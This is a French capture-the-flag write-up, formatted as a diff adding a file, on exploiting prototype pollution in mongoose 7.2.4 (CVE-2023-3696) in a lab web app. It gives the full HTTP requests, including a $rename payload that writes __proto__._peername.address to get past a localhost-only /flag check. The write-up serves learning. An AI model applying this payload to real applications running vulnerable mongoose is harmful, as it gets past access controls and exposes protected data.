@@ -1,0 +1,142 @@
+J'arrive sur la page 
+le but c'est d'acceder a cet endroit (ou a la variable d'environnement FLAG)
+
+app.get('/flag', (req, res) => {
+    const remoteAddress = req.connection.remoteAddress;
+    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
+        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
+    } else {
+        res.status(403).json({ Message: 'Access denied' });
+    }
+})
+
+Je trouves aucune erreur logique dans le code donc je me dis que ça doit être un CVE
+J'ai accès au code source et au package-lock.json avec les versions des packets installés:
+"node_modules/mongoose": {
+    "version": "7.2.4"
+
+cette version est assez ancienne et quand je cherche sur internet je tombes sur un cve de niveau 10 !
+CVE-2023-3696
+https://security.snyk.io/vuln/SNYK-JS-MONGOOSE-5777721
+je cite:
+Overview
+
+mongoose is a Mongoose is a MongoDB object modeling tool designed to work in an asynchronous environment.
+
+Affected versions of this package are vulnerable to Prototype Pollution in document.js, via update functions such as findByIdAndUpdate().
+
+
+et ça tombes bien on est exactement dans cette situation avec un findByIdAndUpdate()
+
+app.post('/update', async (req, res) => {
+    try {
+        const { noteId } = req.body;
+        await Note.findByIdAndUpdate(noteId, req.body);
+        let result = await Note.find({ _id: noteId });
+        res.json(result);
+    } catch (error) {
+        console.error(error);
+        res.status(500).json({ Message: "An error occurred" });
+    }
+});
+
+ce passage utilise bien 
+await Note.findByIdAndUpdate(noteId, req.body);
+let result = await Note.find({ _id: noteId });
+
+qui sont les 2 fonctions qui permettent d'executer l'attaque
+
+Maintenant il faut que je trouves comment polluer pour mon bonheur
+
+en lancant le programme en local et en le bourrant de logs
+
+app.get('/flag', (req, res) => {
+    console.log("flag 1:",JSON.stringify(Object.prototype))
+    console.log("flag 2:",Object.prototype)
+    console.log("flag 3:",Object)
+    const remoteAddress = req.connection.remoteAddress;
+    console.log("flag 4:",remoteAddress)
+    console.log("flag 5:",req)
+    console.log("flag 6:",req.__proto__)
+    console.log("flag 7:",remoteAddress.__proto__)
+    if (remoteAddress === '127.0.0.1' || remoteAddress === '::1' || remoteAddress === '::ffff:127.0.0.1') {
+        res.send(process.env.FLAG ?? 'HTB{f4k3_fl4g_f0r_t3st1ng}');
+    } else {
+        res.status(403).json({ Message: 'Access denied' });
+    }
+});
+
+je me rends compte dans le req ("flag 5") que l'adresse est stockée dans  _peername: { address: '::ffff:172.17.0.1', family: 'IPv6', port: 43298 },
+
+je pollue donc en mettant l' Object.prototype._peername.address a 127.0.0.1 : et ça fonctionne !
+De ce que j'ai compris avant d'appeler remoteAddress le _peername.adresse est censé etre undefined il n'est populate qu'une seule fois lors du premier appel a remoteAdress (un getter surement), mais si il est déjà populate il change pas. Donc là en le polluant il reste et n'est pas overwrite.
+
+étapes en détail:
+
+après avoir créé une note je modifie le contenue avec la valeure de la variable que je veux populate
+
+POST /update HTTP/1.1
+Host: localhost:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:1337/
+Content-Type: application/json
+Content-Length: 74
+Origin: http://localhost:1337
+Connection: keep-alive
+Priority: u=0
+
+{"noteId":"6995ce4284849a901fa222ce","title":"test","content":"127.0.0.1"}
+
+ensuite je lance le rename pour copier coller le content vers la nouvelle variable (dans le proto)
+
+POST /update HTTP/1.1
+Host: localhost:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost:1337/
+Content-Type: application/json
+Content-Length: 89
+Origin: http://localhost:1337
+Connection: keep-alive
+Priority: u=0
+
+{"$rename":{"content":"__proto__._peername.address"},"noteId":"6995ce4284849a901fa222ce"}
+
+dans les logs on peut voir que l'Object a été bien pollué
+
+flag 2: [Object: null prototype] {
+    _peername: { address: '127.0.0.1' }
+  }
+  
+ensuite il reste plus qu'a aller chercher le flag
+
+GET /flag HTTP/1.1
+Host: localhost:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+GET /flag HTTP/1.1
+Host: localhost:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+Terminé !
+
+Conclusion:
+
+J'ai ADORÉ ce challenge, je connaissais pas dutout le prototype polution et j'ai passé un super moment à apprendre et a tester
